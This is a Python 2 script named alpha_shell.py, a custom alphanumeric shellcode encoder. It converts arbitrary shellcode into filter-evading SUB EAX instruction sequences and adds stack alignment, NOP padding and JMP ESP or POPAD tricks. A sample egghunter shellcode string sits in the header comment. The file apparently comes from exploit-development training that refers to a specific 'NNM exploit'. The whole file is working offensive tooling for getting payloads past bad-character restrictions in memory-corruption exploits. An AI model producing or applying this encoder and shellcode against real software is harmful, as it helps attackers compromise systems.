#!/usr/bin/env python
# egghunter to test :
# \x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x57\x30\x30\x54\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7
# \x57\x30\x30\x54 ==> W00T
# \x77\x30\x30\x74 ==> w00t

import argparse
import string

def banner():

    print '''
        =========================================================================
        |                             alpha_shell.py                            |
        |                 Custom alphanumeric shellcode generator               |
        |                                                                       |
        |               Author: Alexandre Basquin | x3tb3t | @x3tb3t            |
        |              Usage: alpha_shell.py [options] (-h or --help)           |
        =========================================================================

!!!!!!!!!!!!!!!! If egghunter, don't forget to reverse the eggs in the input !!!!!!!!!!!!!!!
!!! Example: W00T must be supply as \\x54\\x30\\x30\\x57 instead of \\x57\\x30\\x30\\x54 !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

    '''

def usage():
    banner()
    print '''

    '''

def isDivisibleBy4(shellcode, size):
    if size % 4 == 0:
        return 1
    else:
        return -1

def addPaddingToShellcode(shellcode):
    # add some nops
    while (len(shellcode) / 2 ) % 4 != 0:
        shellcode = shellcode + '90'
    print '[+] New shellcode (%s bytes) :' % (len(shellcode) / 2)
    # print shellcode as \x41\x41\x41\x41
    print '\\x'.join(shellcode[i:i+2] for i in range(-2, len(shellcode), 2))
    return shellcode 

def reverseShellcode(shellcode):
    # reverse the shellcode
    shellcodeBytes = [''.join(x) for x in zip(*[iter(shellcode)]*2)]
    littleIndianShellcode = list(reversed(shellcodeBytes))
    return littleIndianShellcode

def splitShellcodeIntoChunks(shellcodeBytes):
    chunks = [shellcodeBytes[i:i + 4] for i in xrange(0, len(shellcodeBytes), 4)]
    return chunks

def twos_comp(val, bits):
    val = val - (1 << bits)        # compute negative value
    return val                      # return positive value as is

def findMagikNumber(allowedCharsList, targetNumber, index):
    ylist = []
    result = []

    for char in allowedCharsList:
        char = int(char, 16)
        ylist.append(char)

    for i in xrange(len(ylist)):
        for j in xrange(i + 1, len(ylist)):
            sno = targetNumber - ylist[i] - ylist[j]
            for k in xrange(i + 1, len(ylist)):
                if ylist[k] == sno:
                    #goodTrio = [hex(ylist[i]), hex(ylist[j]), hex(ylist[k])]                
                    goodTrio = ['0x{:02x}'.format(ylist[i]), '0x{:02x}'.format(ylist[j]), '0x{:02x}'.format(ylist[k])]                
                    result.append(goodTrio)
                    #print hex(ylist[i]), hex(ylist[j]), hex(ylist[k])
                    #print hex(ylist[i] + ylist[j] + ylist[k])

    return result[int(index)]


def main():
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--shellcode", help="shellcode (ex: \\x21\\x34\\x04\\x12)")
    parser.add_argument("-a", "--addchars", help="add allowed characters (ex: \\xff\\xeb")
    parser.add_argument("-b", "--badchars", help="badchars (ex: \\x00\\x09\\x0a\\x0b)")
    parser.add_argument("-n", "--nnm", help="add NNM allowed chars only (--nnm true)")
    parser.add_argument("-i", "--index", help="index in findMagikNumbers() (--index 1)")
    args = parser.parse_args()

    if (args.shellcode == None):
        banner()
        parser.print_help()
        return 0

    banner()

    encodedShellcode = ''
    encodedShellcodeForStack = ''
    shellcode = args.shellcode.replace('\\x', '')
    size = len(shellcode) / 2


    if args.nnm == "true":
	
        # only characters used in NNM exploit
        #allowedCharsList = ["21", "24", "25", "2A", "2D", "31", "32", "33", "34", "35", "38", "41", "43", "44", "45", "46", "47", "48", "49", "4A", "4B", "4D", "4E", "50", "52", "53", "54", "55", "58", "5A", "5C", "5E", "61", "65", "66", "6A", "6D", "6E", "6F", "71", "73", "74", "75", "77", "78", "7A", "7E"]
	
        # real charlist as described in CTP pdf
        #allowedCharsList = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "0b", "0c", "0e", "0f", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "1a", "1b", "1c", "1d", "1e", "1f", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "2a", "2b", "2c", "2d", "2e", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "3b", "3c", "3d", "3e", "41", "42", "43", "44", "45", "46", "47", "48", "49", "4a", "4b", "4c", "4d", "4e", "4f", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "5a", "5b", "5c", "5d", "5e", "5f", "60", "61", "62", "63", "64", "65", "66", "67", "68", "69", "6a", "6b", "6c", "6d", "6e", "6f", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79", "7a", "7b", "7c", "7d", "7e", "7f"]
	
        # real charlist as described in CTP pdf minus all characters starting by 0
        allowedCharsList = ["10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "1a", "1b", "1c", "1d", "1e", "1f", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "2a", "2b", "2c", "2d", "2e", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "3b", "3c", "3d", "3e", "41", "42", "43", "44", "45", "46", "47", "48", "49", "4a", "4b", "4c", "4d", "4e", "4f", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "5a", "5b", "5c", "5d", "5e", "5f", "60", "61", "62", "63", "64", "65", "66", "67", "68", "69", "6a", "6b", "6c", "6d", "6e", "6f", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79", "7a", "7b", "7c", "7d", "7e", "7f"]

        # charlist to test minimum characters allowed
        #allowedCharsList = ["31","32","33","34","35","36","37","38","39","3b","3c","3d","3e","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f"]
        print '\n[*] NNM selected'
    
    else:
	
        badchars = args.badchars.replace('\\x', '')
        badcharsList = list(badchars[i:i+2] for i in range(0, len(badchars), 2))
        print '\n[*] Bad characters :\n' + '\t[+] ' + str(badcharsList)

        #allowedCharsList = list(string.ascii_letters)
    	allowedCharsList = list(string.printable)
    	for i, char in enumerate(allowedCharsList):
            allowedCharsList[i] = hex(ord(char)).replace('0x', '')

    	for i in range(0, 9):
       	    numHex = hex(ord(str(i))).replace('0x', '')
            allowedCharsList.append(numHex)

    	if args.addchars != None:
            addchars = args.addchars.replace('\\x', '')
            addcharsList = list(addchars[i:i+2] for i in range(0, len(addchars), 2))
            print '\n[*] Adding characters :\n' + '\t[+] ' + str(addcharsList)

            for char in addcharsList:
                allowedCharsList.append(char)    

        for char in badcharsList:
            if char in allowedCharsList:
                allowedCharsList.remove(char)

    print '\n[*] Allowed characters :\n' + '\t[+] ' + str(allowedCharsList)

    print '\n[*] shellcode (%s bytes) : ' % (size)
    # print shellcode as \x41\x41\x41\x41
    print '\t[+] ' + '\\x'.join(shellcode[i:i+2] for i in range(-2, len(shellcode), 2))

    print '\n[*] Verifying if shellcode is divisible by four'
    if isDivisibleBy4(shellcode, size) != -1:
        print '\t[+] shellcode is divisible by 4'
    else:
        shellcode = addPaddingToShellcode(shellcode)

    print '\n[*] Converting shellcode to litlle indian'
    revShellcodeBytes = reverseShellcode(shellcode)
    revShellcode = ''.join(revShellcodeBytes)
    littleIndianShellcode = '\\x'.join(revShellcode[i:i+2] for i in range(-2, len(revShellcode), 2))

    print '\t[+] ' + littleIndianShellcode

    print '\n[*] Splitting reversed shellcode into 4 bytes chunks'
    chunksList = splitShellcodeIntoChunks(revShellcodeBytes)

    # Iterate through each chunk
    cnt = 0
    for chunk in chunksList:
        cnt += 1
        number = ''.join(chunk)

        secondComplement = twos_comp(int(number,16), 32)
        secondComplement = hex(secondComplement)
        secondComplement = secondComplement.replace('-0x', '')
        secondComplement = secondComplement.replace('0x', '')
        
        while len(secondComplement) < 8:
            secondComplement = '0' + secondComplement

        chunkHex = '\\x'.join(number[i:i+2] for i in range(-2, len(number), 2))
        print '\n\t[+] Chunk %s : %s' % (cnt, chunkHex)
        print '\tSecond complement : ' + secondComplement

        secondComplementBytes = [secondComplement[i:i + 2] for i in xrange(0, len(secondComplement), 2)]

        # find 3 values which the addition gives 1 byte of second complement
        secondComplementBytesCnt = 0
        byte1 = []
        byte2 = []
        byte3 = []
        byte4 = []


    	if args.index != None:
	    index = args.index
	else:
	    index = 1
	
        for byte in secondComplementBytes:

            secondComplementBytesCnt += 1

            byteDec = int(byte, 16)
            division3 = '0x{:x}'.format(int(byteDec/0x3))
            #print division3
            if int(division3,16) > int('0x20', 16):
                print '\tNo overflow needed for byte %s : \t' % (secondComplementBytesCnt) + byte 
                secondComplementByte = findMagikNumber(allowedCharsList, byteDec, index)
                #print secondComplementByte
                if  secondComplementBytesCnt == 1:
                    byte1 = secondComplementByte
                if  secondComplementBytesCnt == 2:
                    byte2 = secondComplementByte
                if  secondComplementBytesCnt == 3:
                    byte3 = secondComplementByte    
                if  secondComplementBytesCnt == 4:
                    byte4 = secondComplementByte
            else:
                print '\tOverflow needed for byte %s : \t\t' % (secondComplementBytesCnt) + byte

                byte = '1' + str(byte)
                byteDec = int(byte, 16)
                secondComplementByte = findMagikNumber(allowedCharsList, byteDec, index)
                #print secondComplementByte
                if  secondComplementBytesCnt == 1:
                    byte1 = secondComplementByte
                if  secondComplementBytesCnt == 2:
                    byte2 = secondComplementByte
                    #byte3[secondComplementBytesCnt - 1] = hex(int(byte3[secondComplementBytesCnt - 1], 16) - int('0x1', 16))
                    byte1Tmp1 = hex(int(byte1[0], 16) - int('0x1', 16))
                    byte1Tmp2 = hex(int(byte1[1], 16) - int('0x1', 16))
                    byte1Tmp3 = hex(int(byte1[2], 16) - int('0x1', 16))
                    
                    if byte1Tmp1.replace('0x', '') in allowedCharsList:
                        byte1[0] = byte1Tmp1
                    elif byte1Tmp2.replace('0x', '') in allowedCharsList:
                        byte1[1] = byte1Tmp2
                    elif byte1Tmp3.replace('0x', '') in allowedCharsList:
                        byte1[2] = byte1Tmp3
                    else:
                        print '[!] Error in overflow compensation. Every preceding byte -1 result in non allowed char'
                        break

                if  secondComplementBytesCnt == 3:
                    byte3 = secondComplementByte
                    byte2Tmp1 = hex(int(byte2[0], 16) - int('0x1', 16))
                    byte2Tmp2 = hex(int(byte2[1], 16) - int('0x1', 16))
                    byte2Tmp3 = hex(int(byte2[2], 16) - int('0x1', 16))
                    
                    if byte2Tmp1.replace('0x', '') in allowedCharsList:
                        byte2[0] = byte2Tmp1
                    elif byte2Tmp2.replace('0x', '') in allowedCharsList:
                        byte2[1] = byte2Tmp2
                    elif byte2Tmp3.replace('0x', '') in allowedCharsList:
                        byte2[2] = byte2Tmp3
                    else:
                        print '[!] Error in overflow compensation. Every preceding byte -1 result in non allowed char'
                        break

                if  secondComplementBytesCnt == 4:
                    byte4 = secondComplementByte
                    byte3Tmp1 = hex(int(byte3[0], 16) - int('0x1', 16))
                    byte3Tmp2 = hex(int(byte3[1], 16) - int('0x1', 16))
                    byte3Tmp3 = hex(int(byte3[2], 16) - int('0x1', 16))
                    
                    if byte3Tmp1.replace('0x', '') in allowedCharsList:
                        byte3[0] = byte3Tmp1
                    elif byte3Tmp2.replace('0x', '') in allowedCharsList:
                        byte3[1] = byte3Tmp2
                    elif byte3Tmp3.replace('0x', '') in allowedCharsList:
                        byte3[2] = byte3Tmp3
                    else:
                        print '[!] Error in overflow compensation. Every preceding byte -1 result in non allowed char'
                        break
                    
        print ''
        encodedChunks = []
        encodedChunksForStack = []
        for w, x, y, z in zip(byte1, byte2, byte3, byte4):
            subInstruction = w + x +y + z 
            subInstruction = ''.join(subInstruction).replace('0x', '')
            #encodedChunks.append(subInstruction)
            
            subInstructionBytes = [''.join(x) for x in zip(*[iter(subInstruction)]*2)]
            littleIndianSubInstruction = list(reversed(subInstructionBytes))
            littleIndianSubInstruction = ''.join(littleIndianSubInstruction)
            littleIndianSubInstruction = '2d' + littleIndianSubInstruction

            #subInstruction = '\\x'.join(subInstruction[i:i+2] for i in range(-2, len(subInstruction), 2))
            littleIndianSubInstructionToPrint = '\\x'.join(littleIndianSubInstruction[i:i+2] for i in range(-2, len(littleIndianSubInstruction), 2))
            
            encodedChunksForStack.append(littleIndianSubInstruction)
            #print '\nsubInstruction :\n\t' + subInstruction
            #print 'littleIndianSubInstructionWithSubEax :\n\t' + littleIndianSubInstructionWithSubEax
            print '\tsub eax, 0x' + subInstruction + '  ===>  ' + littleIndianSubInstructionToPrint

        zeroOutEax = (
        '254A4D4E55'  # AND EAX,554E4D4A
        '253532312A'  # AND EAX,2A313235
        )

        pushEax = '50'
        padding = '4141'

        #encodedChunks = ''.join(encodedChunks)
        encodedChunksForStack = ''.join(encodedChunksForStack)
        #print 'encodedChunksForStack : ' + encodedChunksForStack 
        #encodedShellcode = encodedShellcode + zeroOutEax + encodedChunks + pushEax
        encodedShellcodeForStack = encodedShellcodeForStack + zeroOutEax + encodedChunksForStack + pushEax + padding


        # Add some popad to align the stack

    #print '\nEncoded shellcode (%s bytes) :' % (len(encodedShellcode) / 2)
    #print '\\x'.join(encodedShellcode[i:i+2] for i in range(-2, len(encodedShellcode), 2))

    #print '\nEncoded shellcode (ASCII) :'
    #asciiShellcode = ''.join(encodedShellcode[i:i+2] for i in range(0, len(encodedShellcode), 2)).decode('hex') 
    #print asciiShellcode

    # Finding good nops characters (90, 41, etc.)
    print '\n[*] Find nop character:'
    if '90' in allowedCharsList:
        nops = '90' * 32
        print '\t[+] \\x90 is allowed'
        print '\t[+] Padding: \\x90\\x90'
    elif '41' in allowedCharsList:
        nops = '41' * 32
        print '\t[+] \\x41 is allowed'
        print '\t[+] Padding: \\x41\\x41'
    elif '4C' in allowedCharsList:
        nops = '4C' * 32
        print '\t[+] \\x4C is allowed'
        print '\t[+] Padding: \\x4C\\x4C'
    else:
        print '[-] no nops character found !'

    print('\n[*] Add Zero Out EAX for each block:\n'
          '\t[+] \\x25\\x4A\\x4D\\x4E\\x55  # AND EAX,554E4D4A\n'
          '\t[+] \\x25\\x35\\x32\\x31\\x2A  # AND EAX,2A313235'
        )

    print '\n[*] Finding technic to align stack'

    if args.nnm == 'true':

        print '\t[+] Align stack for NNM exploit'
        print '\n[+] Building the final payload:'
        print '\t[+] [alignStack: esp into eax / align eax / pop esp] + [padding] + [zeroOutEax][subInstructions][pushEax][padding] x blocks' 

        espIntoEax = (
        '254A4D4E55'    # 25 4A4D4E55      AND EAX,554E4D4A     ; zero out EAX
        '253532312A'    # 25 3532312A      AND EAX,2A313235     ; 
        '54'            # 54               PUSH ESP             ; put ESP into EAX
        '58')           # 58               POP EAX              ;
        
        alignEsp = (
        '2D664D5555'    # 2D 664D5555      SUB EAX,55554D66     ; make EAX equal to where egghunter gets decoded
        '2D664B5555'    # 2D 664B5555      SUB EAX,55554B66     ;       
        '2D6A505555'    # 2D 6A505555      SUB EAX,5555506A     ;
        '50'            # 50               PUSH EAX             ; Align ESP to that address to start pushing decoded egghunter
        '5C')           # 5C               POP ESP              ;

        encodedShellcodeForStack = espIntoEax + alignEsp + padding + encodedShellcodeForStack

        # fix les 2 \x41 at the end of the shellcode
        encodedShellcodeForStack = encodedShellcodeForStack[:-4]

        print 'align stack:' 
        alignStack = espIntoEax + alignEsp
        print '\\x'.join(alignStack[i:i+2] for i in range(-2, len(alignStack), 2))

    elif 'ff' and 'e4' in allowedCharsList:
        print '\t[+] JMP ESP allowed : adding \\xff\\xe4 to jump to the decoded shellcode'
        print '\n[+] Building the final payload:'
        print '\t[+] [zeroOutEax][subInstructions][pushEax][padding] x blocks + [jmp esp]'
        encodedShellcodeForStack = encodedShellcodeForStack + 'ffe4'
    else:
        print '\t[-] JMP ESP not allowed'

        if '61' in allowedCharsList and nops:
            encodedShellcodeLength = len(encodedShellcodeForStack) / 2
            nbrOfPopad = int(str(float(int(encodedShellcodeLength / 32)) + 1).split('.')[0])
            alignStack = '61' * nbrOfPopad
            encodedShellcodeForStack = alignStack + encodedShellcodeForStack + nops
            print '\t[+] POPAD allowed : adding %s popad at begining and 32 nops at the end' % (nbrOfPopad)
            print '\n[+] Building the final payload:'
            print '\t[+] [align stack: popad x %s] + [zeroOutEax][subInstructions][pushEax][padding] x blocks + [nops]' % (nbrOfPopad)
        else:
            print '\t[-] POPAD not allowed'


    print "\n\n\nRESULT\n======"    
    print '[+] Encoded shellcode to put on stack  (' + str(len(encodedShellcodeForStack) / 2) + ' bytes):'
    print '\\x'.join(encodedShellcodeForStack[i:i+2] for i in range(-2, len(encodedShellcodeForStack), 2))

    print '\n[+] Encoded shellcode to put on stack (ASCII) :'
    asciiShellcodeForStack = ''.join(encodedShellcodeForStack[i:i+2] for i in range(0, len(encodedShellcodeForStack), 2)).decode('hex') 
    print asciiShellcodeForStack

    
    print "\n\n\nIMPORTANT\n========="
    print("!!!!!!!!!!!!!!!! If egghunter, don't forget to reverse the eggs in the input !!!!!!!!!!!!!!!\n"
          "!!!!!!! Example: W00T must be supply as \\x54\\x30\\x30\\x57 instead of \\x57\\x30\\x30\\x54 !!!!!!!\n"
          "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n")
    
    print("\n!!! If wants to get 3 sub instructions to align ESP, give target address in reverse order !!\n"
          "!!!!!!!!!!!!! Example: To obtain 1035FFB4 in the command enter \\xB4\\xFF\\x35\\x10 !!!!!!!!!!!!\n"
          "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n")
 


if __name__ == '__main__':
    main()
